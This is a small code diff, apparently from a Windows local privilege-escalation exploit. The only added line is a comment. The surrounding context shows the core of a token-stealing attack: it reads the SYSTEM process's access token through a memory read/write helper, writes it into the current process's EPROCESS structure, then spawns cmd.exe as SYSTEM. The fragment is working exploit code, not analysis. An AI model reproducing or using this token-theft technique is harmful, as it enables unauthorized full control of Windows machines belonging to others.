@@ -151,6 +151,7 @@ int main() {
 	hpmm.ReadVirtData(SystemProc + OFFSET_EPROCESS_TOKEN, sizeof(SystemToken), &SystemToken);
 	hpmm.WriteVirtData(OurProcess + OFFSET_EPROCESS_TOKEN, sizeof(SystemToken), &SystemToken);
 
+	// let's all love lain
 	system("C:\\Windows\\System32\\cmd.exe");
 
 }
